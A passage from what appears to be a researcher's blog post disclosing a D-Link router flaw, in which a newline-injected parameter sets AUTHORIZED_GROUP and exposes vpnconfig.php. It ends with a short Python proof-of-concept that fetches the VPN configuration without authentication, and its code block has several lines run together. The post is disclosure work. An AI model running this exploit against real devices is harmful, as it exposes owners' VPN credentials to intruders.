Following the analysis of the routine, we can see how the information we send is sorted by functions (sobj\_add\_string, sobj\_add\_char, sobj\_get\_string) using the register $a0, which is used as a ptr\_buffer pointer formatting variables, leaving $a0 as an argument of xmldbc\_ephp( ) for final validation.

![]()

copy and send structure

After the last copy with sobj\_get\_string, you can observe in memory how the AUTHORIZED\_GROUP variable is with the value that we control.

![]()

memory

With this, the PHP code will then be executed, seting the variable “AUTHORIZED\_GROUP” as 1, with which we are authorized to read the configuration of the VPN (bottom table of the following image).

![]()

vpnconfig.php file

After executing a simple curl with a valid payload, we get the stored configuration of the vpnconfig.php file.

![]()

configuration result

# Exploit PoC

```
import requests
# Miguel Mendez Z.FILES = ["vpnconfig.php"]
IP = "192.168.0.1"
PORT = "80"headers = {'content-type': 'application/x-www-form-urlencoded'}print "\n-----------VPN-------------\n"
url_vpn = 'http://{ip}:{port}/{file1}?pwnd=%0a'.format(ip=IP, port=PORT, file1=FILES[0])
print(requests.get(url_vpn).text)
```
# Video

**Dlink**: <https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10147>

By3…

[Exploitation](/tag/exploitation?source=post_page-----faf1a9a13f3f--------------------------------)[IoT](/tag/iot?source=post_page-----faf1a9a13f3f--------------------------------)

--

--

[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:96:96/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:128:128/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)Follow[## Written by Miguel Méndez Z.](/%40s1kr10s?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)[142 Followers](/%40s1kr10s/followers?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)·[45 Following](/%40s1kr10s/following?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)

<https://s1kr10s.github.io/whoami.html> — @s1kr10s

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----faf1a9a13f3f--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----faf1a9a13f3f--------------------------------)[About](/about?autoplay=1&source=post_page-----faf1a9a13f3f--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----faf1a9a13f3f--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----faf1a9a13f3f--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----faf1a9a13f3f--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----faf1a9a13f3f--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----faf1a9a13f3f--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----faf1a9a13f3f--------------------------------)[Teams](/business?source=post_page-----faf1a9a13f3f--------------------------------)


